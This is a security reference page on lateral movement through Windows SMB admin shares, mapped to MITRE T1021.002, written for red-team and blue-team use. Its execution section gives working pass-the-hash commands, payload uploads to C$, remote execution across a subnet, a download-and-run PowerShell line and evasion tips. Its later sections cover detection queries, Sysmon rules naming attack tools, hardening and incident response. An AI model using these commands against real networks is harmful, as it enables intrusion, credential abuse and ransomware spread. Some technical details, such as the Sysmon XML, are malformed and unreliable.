# [LM-REMOTE-001]: SMB/Windows Admin Shares

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-REMOTE-001 |
| **MITRE ATT&CK v18.1** | [T1021.002](https://attack.mitre.org/techniques/T1021/002/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Windows Endpoint |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Windows Server 2016-2025, Windows 10/11 |
| **Patched In** | N/A - Inherent Windows functionality |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** SMB (Server Message Block) lateral movement exploits the default Windows administrative shares (C$, D$, ADMIN$, IPC$) to execute commands and transfer files between networked systems. Once an attacker has valid credentials or NTLM hashes (via Pass-the-Hash), they can leverage these shares to upload malware, execute commands via tools like `psexec`, or extract sensitive files. This technique bypasses network segmentation when proper micro-segmentation and egress filtering are absent.

**Attack Surface:** SMB protocol (TCP 445), Windows Admin Shares ($IPC, $ADMIN, $C, $D), Windows Credential Manager, Active Directory Credentials.

**Business Impact:** **Critical—Network-wide compromise potential.** An attacker with credentials for a single compromised system can laterally move to all networked servers, deploy ransomware across infrastructure, exfiltrate sensitive data from file shares, and establish persistent backdoors.

**Technical Context:** Execution typically takes seconds to minutes per target. Detection likelihood is moderate if SMB connection logging is enabled (Event ID 5140); however, many organizations disable this due to performance impact. Indicators include suspicious remote file execution, unusual SMB traffic patterns, and command execution on non-standard service accounts.

### Operational Risk

- **Execution Risk:** Medium—Requires valid credentials or hash, but SMB is ubiquitous in Windows environments.
- **Stealth:** Medium—SMB shares are normal in Windows networks; detecting suspicious access requires proper auditing (often disabled).
- **Reversibility:** No—File modifications and executed commands leave permanent artifacts; backdoors require investigation and cleanup.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.3 | Enable "Audit credential validation" and "Audit NTLM authentication" |
| **DISA STIG** | WN10-00-000020 | Enable "Audit logon events" |
| **NIST 800-53** | AC-3 (Access Enforcement), AU-2 (Audit Events) | Monitor network access and enforce least privilege |
| **GDPR** | Art. 32 | Security of Processing—access controls and logging |
| **NIS2** | Art. 21 | Cyber Risk Management—network segmentation and monitoring |
| **ISO 27001** | A.9.2 (User Access Management) | Monitor privileged access and lateral movement |
| **ISO 27005** | Risk Scenario: "Compromised Account - Network-wide Lateral Movement" | Detect and contain unauthorized network access |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Valid domain or local credentials, or valid NTLM hash (Pass-the-Hash attack).
- **Required Access:** Network access to target via port 445 (SMB), valid credentials.

**Supported Versions:**
- **Windows:** Server 2016, 2019, 2022, 2025 (all versions affected)
- **Tools Required:**
  - [Impacket (smbexec.py)](https://github.com/SecureAuthCorp/impacket) (Linux-based lateral movement)
  - [Invoke-PSExec](https://github.com/Kevin-Robertson/Invoke-PSExec) (PowerShell alternative)
  - [psexec.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) (Sysinternals)
  - [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Network enumeration and exploitation)

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Pass-the-Hash via Impacket (Linux/Cross-Platform)

**Supported Versions:** Server 2016-2025

#### Step 1: Enumerate SMB Share Availability

**Objective:** Identify accessible SMB shares on the target system.

**Command:**
```bash
# Using Impacket's smbclient
python3 /opt/impacket/examples/smbclient.py -hashes :AAAABBBBCCCCDDDDEEEEFFFFGGGG1111 'DOMAIN/user@target.local'
```

**Expected Output:**
```
Type help for list of commands
# shares

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        D$              Disk      Data share
        IPC$            IPC       Remote IPC
        SYSVOL          Disk      logon server share
        NETLOGON        Disk      logon server share
```

**What This Means:**
- ADMIN$, C$, D$ shares indicate SMB is active and accessible.
- SYSVOL/NETLOGON confirm the target is a Domain Controller or domain-joined system.

**OpSec & Evasion:**
- SMB connection logs are generated (Event ID 5140 if enabled).
- Detection likelihood: Medium (if SMB connection auditing is enabled).
- **Mitigation:** Enumerate shares minimally; avoid repeated failed connections.

#### Step 2: Upload Malware/Payload to Accessible Share

**Objective:** Transfer an executable to the target system.

**Command:**
```bash
# Using Impacket's smbclient to upload
python3 /opt/impacket/examples/smbclient.py -hashes :AAAABBBBCCCCDDDDEEEEFFFFGGGG1111 'DOMAIN/user@target.local' -c 'put /path/to/beacon.exe C$\Windows\Temp\beacon.exe'
```

**Expected Output:**
```
putting file /path/to/beacon.exe as C$\Windows\Temp\beacon.exe done
```

**What This Means:**
- File successfully uploaded to C:\Windows\Temp\ on the remote system.
- Attacker now has arbitrary file write access.

**OpSec & Evasion:**
- File creation event logged (Event ID 4656 if audited).
- **Mitigation:** Upload to world-writable directories (C:\Windows\Temp, C:\ProgramData); use legitimate binary names.
- Detection likelihood: Low-Medium (depends on file monitoring).

#### Step 3: Execute Remote Command via psexec

**Objective:** Execute uploaded payload with system/admin privileges.

**Command:**
```bash
# Using Impacket's smbexec (no file upload, executes via SMB directly)
python3 /opt/impacket/examples/smbexec.py -hashes :AAAABBBBCCCCDDDDEEEEFFFFGGGG1111 'DOMAIN/user@target.local' -c 'whoami'
```

**Expected Output:**
```
C:\Windows\system32> whoami
domain\system
```

**Command (Impacket atexec - Uses Task Scheduler):**
```bash
python3 /opt/impacket/examples/atexec.py -hashes :AAAABBBBCCCCDDDDEEEEFFFFGGGG1111 'DOMAIN/user@target.local' 'C:\Windows\Temp\beacon.exe'
```

**What This Means:**
- Command executed on remote system with privileges of the compromised account.
- Remote code execution achieved; attacker can now run arbitrary commands.

**OpSec & Evasion:**
- Multiple event logs generated: Event ID 4688 (Process Creation), Event ID 5140 (SMB Access), Event ID 4698 (Scheduled Task).
- **Mitigation:** Use living-off-the-land binaries (cmd.exe, powershell.exe) to blend in; avoid suspicious executable names.
- Detection likelihood: High (if process auditing enabled).

---

### METHOD 2: Pass-the-Hash via PowerShell (Native Windows)

**Supported Versions:** Server 2016-2025, PowerShell 5.0+

#### Step 1: Load Hash into PowerShell Session

**Objective:** Prepare NTLM hash for authentication without plaintext password.

**Command:**
```powershell
# Import Invoke-PSExec function
IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-PSExec/master/Invoke-PSExec.ps1')

# Define hash and target
$Hash = "AAAABBBBCCCCDDDDEEEEFFFFGGGG1111"
$Target = "192.168.1.10"
$Domain = "DOMAIN"
$Username = "user"
```

**Expected Output:**
```powershell
# No output; variables defined
```

**What This Means:**
- PowerShell environment prepared for Pass-the-Hash execution.

#### Step 2: Execute Command via PSExec

**Objective:** Execute arbitrary command on remote system.

**Command:**
```powershell
# Execute command via SMB using PSExec
Invoke-PSExec -Target $Target -Domain $Domain -Username $Username -Hash $Hash -Command "whoami" -OnlyStdOut
```

**Expected Output:**
```
domain\system
```

**What This Means:**
- Remote command executed with hash-based authentication.
- Attacker achieves code execution without plaintext password.

**OpSec & Evasion:**
- Process creation events logged (Event ID 4688).
- SMB traffic visible in network logs.
- **Mitigation:** Execute in-memory PowerShell to avoid disk artifacts; use legitimate processes for command execution.
- Detection likelihood: Medium-High (PowerShell logging may trigger).

---

### METHOD 3: CrackMapExec (Comprehensive Network Exploitation)

**Supported Versions:** Server 2016-2025

#### Step 1: Identify Accessible Systems

**Objective:** Enumerate all SMB-accessible targets on the network.

**Command:**
```bash
# Scan network for SMB services
cme smb 192.168.1.0/24 -u user -H AAAABBBBCCCCDDDDEEEEFFFFGGGG1111 --shares
```

**Expected Output:**
```
SMB         192.168.1.10    445    SERVER01         [*] Windows Server 2019 Enterprise (build:17763)
SMB         192.168.1.10    445    SERVER01         [-] FAILED LOGIN: 0/0
SMB         192.168.1.11    445    SERVER02         [+] DOMAIN\user:500 (Pwn3d!) (User)
SMB         192.168.1.11    445    SERVER02         C$    READ,WRITE,DELETE
SMB         192.168.1.11    445    SERVER02         ADMIN$    READ,WRITE,DELETE
```

**What This Means:**
- SERVER02 is compromised (marked "Pwn3d!") and has writable admin shares.
- Access levels (READ, WRITE, DELETE) indicate full SMB access.

#### Step 2: Execute Command on All Accessible Targets

**Objective:** Mass lateral movement across discovered systems.

**Command:**
```bash
# Execute whoami on all accessible systems
cme smb 192.168.1.0/24 -u user -H AAAABBBBCCCCDDDDEEEEFFFFGGGG1111 -x 'whoami' --exec-method smbexec
```

**Expected Output:**
```
SMB         192.168.1.11    445    SERVER02         [+] DOMAIN\user (Pwn3d!)
SMB         192.168.1.11    445    SERVER02         [+] Executed command "whoami"
SMB         192.168.1.11    445    SERVER02         DOMAIN\SYSTEM
```

**What This Means:**
- Command executed on all accessible targets simultaneously.
- Attacker can now deploy ransomware, exfiltrate data, or establish backdoors network-wide.

**OpSec & Evasion:**
- Multiple SMB connections and process creations generate substantial logs.
- **Mitigation:** Stagger command execution to avoid detection; use legitimate business hours for lateral movement.
- Detection likelihood: High (bulk SMB access with execution).

---

## 4. TOOLS & COMMANDS REFERENCE

### Impacket (Linux-based Lateral Movement)

**Repository:** [GitHub - SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)

**Version:** Latest (1.4.10+)

**Installation (Linux):**
```bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install -e .
```

**Key Tools:**
- `smbclient.py` — Interactive SMB share access (upload/download).
- `smbexec.py` — Execute commands via SMB with minimal artifact.
- `atexec.py` — Execute via Windows Task Scheduler (Event ID 4698).
- `wmiexec.py` — Execute via WMI instead of SMB (less logged).

**Usage Example:**
```bash
# Interactive SMB shell
python3 -m impacket.smbclient -hashes :HASH 'DOMAIN/user@target'

# Execute command
python3 -m impacket.smbexec -hashes :HASH 'DOMAIN/user@target' 'whoami'

# Upload file to C$ share
python3 -m impacket.smbclient -hashes :HASH 'DOMAIN/user@target' -c 'put beacon.exe C$\Windows\Temp\'
```

---

### CrackMapExec (Network Exploitation Framework)

**Repository:** [GitHub - byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

**Version:** Latest (5.4.0+)

**Installation:**
```bash
git clone https://github.com/byt3bl33d3r/CrackMapExec.git
cd CrackMapExec
pip3 install -e .
```

**Usage Examples:**
```bash
# Enumerate shares
cme smb 192.168.1.0/24 -u user -p password --shares

# Execute command across network
cme smb 192.168.1.0/24 -u user -H HASH -x 'whoami' --exec-method smbexec

# Dump hashes on compromised system
cme smb 192.168.1.10 -u user -H HASH --sam
```

---

### Invoke-PSExec (PowerShell Alternative)

**Repository:** [GitHub - Kevin-Robertson/Invoke-PSExec](https://github.com/Kevin-Robertson/Invoke-PSExec)

**Usage:**
```powershell
# Download and import
IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-PSExec/master/Invoke-PSExec.ps1')

# Execute with hash
Invoke-PSExec -Target 192.168.1.10 -Domain DOMAIN -Username user -Hash HASH -Command "whoami"
```

---

### psexec.exe (Sysinternals - Official Tool)

**Download:** [Microsoft Sysinternals - psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)

**Installation:**
```cmd
# Download psexec from Sysinternals
# Place in C:\Tools\

# Basic usage
C:\Tools\psexec.exe \\target -u DOMAIN\user -p password -h cmd.exe
```

**Advanced Usage:**
```cmd
# Execute as SYSTEM
psexec.exe \\target -h -d cmd.exe /c "whoami"

# With hash (requires 3rd party tools to convert to plaintext or other method)
# Note: psexec doesn't natively support Pass-the-Hash; use Impacket instead
```

---

## 5. WINDOWS EVENT LOG MONITORING

**Primary Event IDs:**

| Event ID | Source | What It Detects | Detection Difficulty |
|---|---|---|---|
| 5140 | Security | SMB Share Access (logon to share) | Medium |
| 5145 | Security | Detailed SMB Share Access (file operations) | Medium |
| 4672 | Security | Special privileges assigned (SYSTEM) | Medium |
| 4688 | Security | Process creation (command execution) | Low |
| 4698 | Security | Scheduled task creation (Task Scheduler execution) | Low |
| 4720 | Security | Local user account created (persistence) | Low |

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Detailed Tracking**
3. Enable:
   - **Audit Process Creation**: Success and Failure
   - **Audit Process Termination**: Success and Failure
4. Navigate to **Object Access**:
   - Enable **Audit File Share Access**: Success and Failure
   - Enable **Audit Detailed File Share**: Success and Failure
5. Run `gpupdate /force` on target machines

**Event Collection Query (PowerShell):**
```powershell
# Collect SMB-related events from the last 1 hour
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=5140,5145,4688,4698
    StartTime=(Get-Date).AddHours(-1)
} | Sort-Object TimeCreated | Format-Table TimeCreated, ID, MachineName
```

**Forensic Indicators:**
- **Lateral movement SMB activity:** Sudden spike in SMB connections to systems not usually communicating.
- **File upload/execution:** Files in %TEMP% with recent modification times; process creation events from %TEMP%.
- **Scheduled task execution:** Event ID 4698 with suspicious command lines.

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect SMB Lateral Movement with Suspicious Process Execution

**Rule Configuration:**
- **Required Table:** SecurityEvent, DeviceProcessEvents (if Defender enabled)
- **Required Fields:** ComputerName, Account, TargetServerName, Process, CommandLine
- **Alert Severity:** High
- **Frequency:** Every 15 minutes
- **Applies To Versions:** Windows Server 2016+

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4688  // Process creation
| where Process has_any ("cmd.exe", "powershell.exe")
| where CommandLine has_any ("\\\\", "C$", "ADMIN$")
| summarize Count=count() by Computer, Account, Process, CommandLine
| where Count > 1  // Multiple process creations from same account
| join kind=inner (
    SecurityEvent
    | where EventID == 5140  // SMB share access
    | project Computer, Account, ShareName, TimeGenerated
) on Computer, Account
| project TimeGenerated, Computer, Account, Process, CommandLine, ShareName, Count
```

**What This Detects:**
- Process creation (Event ID 4688) immediately following SMB share access (Event ID 5140).
- Multiple executions from the same account indicating lateral movement sweep.
- Execution of cmd.exe or powershell.exe which are commonly abused for lateral movement.

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `SMB Lateral Movement with Process Execution`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `15 minutes`
   - Lookup data from the last: `30 minutes`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Alert name: `{{Computer}} - Suspicious SMB Process Execution`
7. Click **Review + create**

---

#### Query 2: Detect Hash Pass-the-Hash via Impacket/CrackMapExec

**Rule Configuration:**
- **Required Table:** SecurityEvent, Sysmon (if available)
- **Required Fields:** SourceIpAddress, TargetAccount, TargetServerName, CommandLine
- **Alert Severity:** Critical
- **Frequency:** Real-time (every 5 minutes)

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4625  // Failed logon (multiple attempts indicate PtH)
| summarize FailedAttempts=count() by SourceIpAddress, TargetAccount, Computer
| where FailedAttempts > 5  // Threshold for hash spray
| union (
    SecurityEvent
    | where EventID == 4624  // Successful logon after failed attempts
    | where AuthenticationPackage == "NTLM"
    | project Computer, Account=TargetAccount, SourceIpAddress, TimeGenerated
)
| project Computer, Account, SourceIpAddress, FailedAttempts
```

**What This Detects:**
- Multiple failed NTLM authentication attempts (characteristic of hash spraying).
- Successful logon via NTLM immediately after failures (indicates PtH success).
- Lateral movement from attacker-controlled IP to multiple systems.

---

## 7. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Config Snippet:**
```xml
<!-- Detect SMB-based command execution -->
<RuleGroup name="SMB Lateral Movement" groupRelation="or">
  <!-- Detect cmd.exe/powershell.exe with network paths (SMB UNC paths) -->
  <ProcessCreate onmatch="include">
    <CommandLine condition="contains any">cmd.exe \\
    <CommandLine condition="contains any">powershell.exe \\
    <CommandLine condition="contains any">notepad.exe C$
    <CommandLine condition="contains any">certutil.exe C$
  </ProcessCreate>

  <!-- Detect Impacket/psexec process creation via SMB -->
  <ProcessCreate onmatch="include">
    <ParentImage condition="contains">smb</ParentImage>
    <CommandLine condition="contains any">whoami, ipconfig, tasklist</CommandLine>
  </ProcessCreate>

  <!-- Detect network connections to SMB port from suspicious processes -->
  <NetworkConnect onmatch="include">
    <DestinationPort>445</DestinationPort>
    <Image condition="contains any">impacket, crackmap, psexec</Image>
  </NetworkConnect>
</RuleGroup>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-smb-config.xml` with the XML above
3. Install Sysmon with the config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-smb-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10 | Select-Object TimeCreated, Message
   ```

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Enable SMB Signing & Encryption:**
  
  **Manual Steps (Group Policy):**
  1. Open **gpmc.msc**
  2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
  3. Enable: **Microsoft network client: Digitally sign communications (always)**
  4. Enable: **Microsoft network server: Digitally sign communications (always)**
  5. Run `gpupdate /force`
  
  **Manual Steps (Server 2022+):**
  1. Same as above; no version-specific changes.
  
  **Manual Steps (PowerShell):**
  ```powershell
  # Enable SMB signing on all systems
  Set-SmbServerConfiguration -RequireSecuritySignature $true -EncryptData $true -Force
  ```

- **Disable SMB v1 Protocol (Legacy):**
  
  **Manual Steps (PowerShell - Server 2016-2025):**
  ```powershell
  # Disable SMBv1
  Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart
  
  # Verify disabled
  Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol
  ```
  
  **Manual Steps (Group Policy):**
  1. **gpmc.msc** → **Computer Configuration** → **Policies** → **Administrative Templates** → **Network** → **Lanman Workstation**
  2. Enable: **Disable SMBv1**
  3. Run `gpupdate /force`

- **Implement Network Segmentation (Restrict SMB 445):**
  
  **Manual Steps (Firewall Rules):**
  ```powershell
  # Block SMB outbound from regular endpoints
  New-NetFirewallRule -DisplayName "Block SMB to non-fileservers" `
    -Direction Outbound -Action Block -Protocol TCP `
    -RemotePort 445 -RemoteAddress "192.168.0.0/16"
  
  # Allow only to designated fileservers
  New-NetFirewallRule -DisplayName "Allow SMB to fileservers" `
    -Direction Outbound -Action Allow -Protocol TCP `
    -RemotePort 445 -RemoteAddress "192.168.1.100,192.168.1.101"
  ```
  
  **Manual Steps (Group Policy):**
  1. **gpmc.msc** → **Computer Configuration** → **Windows Settings** → **Security Settings** → **Windows Firewall with Advanced Security**
  2. Create inbound and outbound rules to restrict SMB (port 445) to authorized fileservers only.

### Priority 2: HIGH

- **Enforce Strong Authentication & MFA:**
  
  **Manual Steps (Conditional Access - Entra ID):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Block Legacy NTLM Authentication`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **All cloud apps**
  5. **Conditions:**
     - Client apps: **Legacy authentication clients**
  6. **Access controls:**
     - Grant: **Block access**
  7. Enable policy: **On**
  8. Click **Create**

- **Implement Privileged Access Management (PAM):**
  
  **Manual Steps (Azure PIM):**
  1. Go to **Azure Portal** → **Azure AD Privileged Identity Management**
  2. Select **Azure AD roles**
  3. For each critical role (Global Admin, Security Admin):
     - Click role → **Settings** → Enable **Require justification on activation**
     - Set **Activation maximum duration**: 4 hours
     - Enable **Require MFA**: Yes
     - Enable **Require ticket system**: Yes

### Access Control & Policy Hardening

- **Conditional Access Policies:**
  - Require device compliance
  - Block legacy authentication
  - Require MFA for sensitive operations
  - Restrict access by location/IP

- **RBAC/ABAC:**
  - Remove excessive "Domain Admins" group membership
  - Use role-based groups (FileServer Admins, Application Admins)
  - Implement attribute-based restrictions (e.g., Department = "Finance" only)

- **Policy Config:**
  - Enable audit logging for all SMB shares (Event ID 5140, 5145)
  - Implement ReBAC (Relationship-Based Access Control) for sensitive resources
  - Enforce Pass-the-Hash (PtH) mitigations: Credential Guard, Restricted Admin mode

### Validation Command (Verify Fixes)

```powershell
# Check if SMBv1 is disabled
Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol
# Should return: EnableSMB1Protocol : False

# Check if SMB signing is enabled
Get-SmbServerConfiguration | Select-Object RequireSecuritySignature
# Should return: RequireSecuritySignature : True

# Check firewall rules restricting SMB
Get-NetFirewallRule -DisplayName "*SMB*" | Select-Object DisplayName, Action, Direction

# Verify Conditional Access policies
Get-AzureADMSConditionalAccessPolicy | Where-Object { $_.DisplayName -contains "Legacy" }
```

**Expected Output (If Secure):**
```
EnableSMB1Protocol : False
RequireSecuritySignature : True
DisplayName: Block Legacy NTLM Authentication, Action: Block
```

---

## 9. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Network Traffic:**
  - Unexpected SMB connections (TCP 445) from endpoints to non-fileservers.
  - SMB connections during non-business hours or from unexpected source IPs.
  - High volume of failed SMB authentication attempts (hash spraying pattern).

- **Processes:**
  - cmd.exe, powershell.exe with UNC paths (e.g., `cmd.exe \\target\C$\Windows\Temp\malware.exe`).
  - Impacket/CrackMapExec process names or network connections to multiple targets.
  - Task Scheduler processes (svchost.exe with Task Scheduler context).

- **Files:**
  - Executable files in C:\Windows\Temp, C:\ProgramData (common upload locations).
  - Recent modifications to system32 binaries (overwrite indicators).

### Forensic Artifacts

- **Event Logs:**
  - Event ID 5140 (SMB Share Access)
  - Event ID 5145 (Detailed File Share Access)
  - Event ID 4688 (Process Creation)
  - Event ID 4698 (Scheduled Task Creation)
  - Event ID 4624 (Successful Logon) with AuthenticationPackage=NTLM

- **Network:**
  - Netstat output showing established SMB connections: `netstat -ano | find ":445"`
  - Pcap files showing multiple SMB authentication attempts

- **Memory:**
  - Impacket/CrackMapExec process trees in process memory
  - Injected code in legitimate service processes

### Response Procedures

1. **Isolate Affected System:**
   
   **Command (PowerShell):**
   ```powershell
   # Disconnect network adapter
   Disable-NetAdapter -Name "Ethernet" -Confirm:$false
   
   # Or disable NIC via Group Policy
   Set-NetAdapter -InterfaceIndex (Get-NetAdapter | Where-Object {$_.InterfaceDescription -match "Ethernet"}).InterfaceIndex -AdminStatus Down
   ```
   
   **Manual:**
   - Physical isolation: Unplug network cable
   - Or: Open Network Settings → Disconnect from network

2. **Collect Evidence:**
   
   **Command (PowerShell):**
   ```powershell
   # Export Security Event Log
   wevtutil epl Security C:\Evidence\Security.evtx /overwrite:true
   
   # Export SMB-specific events
   Get-WinEvent -FilterHashtable @{LogName='Security'; ID=5140,5145,4688,4698} `
     -MaxEvents 10000 | Export-Csv C:\Evidence\SMB_Events.csv
   
   # Get currently established connections
   netstat -ano > C:\Evidence\netstat.txt
   
   # Get process list at time of incident
   Get-Process | Export-Csv C:\Evidence\ProcessList.csv
   ```
   
   **Manual:**
   - Open **Event Viewer** → Right-click **Security** → **Save All Events As** → `C:\Evidence\Security.evtx`
   - Open **cmd** → `netstat -ano > C:\Evidence\netstat.txt`

3. **Remediate:**
   
   **Command (PowerShell):**
   ```powershell
   # Kill suspicious processes
   Get-Process | Where-Object {$_.ProcessName -match "impacket|crackmap|psexec"} | Stop-Process -Force
   
   # Remove malware files
   Remove-Item "C:\Windows\Temp\beacon.exe" -Force -ErrorAction SilentlyContinue
   Remove-Item "C:\ProgramData\*.exe" -Force -ErrorAction SilentlyContinue
   
   # Reset compromised account password
   Set-ADAccountPassword -Identity "compromised_user" -NewPassword (ConvertTo-SecureString "NewP@ssw0rd!" -AsPlainText -Force) -Reset
   
   # Disable account temporarily during investigation
   Disable-ADAccount -Identity "compromised_user"
   ```
   
   **Manual:**
   - Open **Task Manager** → Find suspicious process → **End Task**
   - Delete malware files: File Explorer → Navigate to C:\Windows\Temp\ → Delete files
   - Reset password: **Active Directory Users and Computers** → Right-click user → **Reset Password**

4. **Long-Term Remediation:**
   
   - Patch all affected systems (KB for SMB vulnerabilities)
   - Reset all domain admin credentials
   - Force password change for compromised accounts
   - Review and tighten firewall rules
   - Enable SMB signing organization-wide
   - Implement privileged access management (PAM)

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-003] PowerView enumeration | Enumerate domain systems and SMB shares |
| **2** | **Credential Access** | [CA-DUMP-001] Mimikatz LSASS extraction | Dump NTLM hashes from compromised system |
| **3** | **Lateral Movement** | **[LM-REMOTE-001] SMB/Admin Shares** | **Use hashes to move laterally via SMB** |
| **4** | **Persistence** | [PERSIST-ACCT-001] AdminSDHolder abuse | Maintain access via ACL manipulation |
| **5** | **Impact** | [IMPACT-RANSOM-001] Ransomware deployment | Deploy ransomware across all accessible systems |

---

## 11. REAL-WORLD EXAMPLES

#### Example 1: WannaCry Ransomware (2017)

- **Target:** Global organizations (NHS UK, Telefónica, Renault)
- **Timeline:** May 12-15, 2017
- **Technique Status:** This exact technique used; WannaCry exploited CVE-2017-0145 to enable SMB-based worm propagation.
- **Attack Flow:** Exploited SMB vulnerability → Lateral movement via SMB shares → Encrypted files on accessible shares
- **Impact:** ~200,000 machines affected; billions in damages.
- **Reference:** [Microsoft Security Update CVE-2017-0145](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)

#### Example 2: NotPetya Ransomware (2017)

- **Target:** Ukraine and global organizations
- **Timeline:** June 27, 2017
- **Technique Status:** SMB propagation using EternalBlue exploit and Pass-the-Hash attacks.
- **Attack Flow:** Initial compromise → Hash dumping → SMB lateral movement → MBR encryption
- **Impact:** Estimated $10 billion in damages; major supply chain disruption.
- **Reference:** [CISA Alert on NotPetya](https://www.cisa.gov/news-events/alerts/2017/06/27/russian-malware-destructive-impact-ukraine)

#### Example 3: Lazarus APT (Sony Hack, 2014)

- **Target:** Sony Pictures Entertainment
- **Timeline:** November 2014
- **Technique Status:** SMB shares used for lateral movement and data exfiltration after initial compromise.
- **Attack Flow:** Spear-phishing → Initial access → SMB enumeration → Credential harvesting → Network-wide movement → Data theft
- **Impact:** 100 terabytes of data stolen; millions in damages.
- **Reference:** [FBI Statement on Sony Attack](https://www.fbi.gov/news/press-releases/2014/fbi-attributes-sony-attack-to-north-korea)

---

## 12. REFERENCES & SOURCES

- [Microsoft Learn - SMB Security](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-security)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [MITRE ATT&CK - Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
- [Impacket Documentation](https://github.com/SecureAuthCorp/impacket)
- [CrackMapExec Wiki](https://github.com/byt3bl33d3r/CrackMapExec/wiki)
- [SpecterOps - The Art of the Overpass-the-Hash](https://posts.specterops.io/pass-the-hash-is-dead-long-live-pass-the-hash-2c30fe6e0d12)

---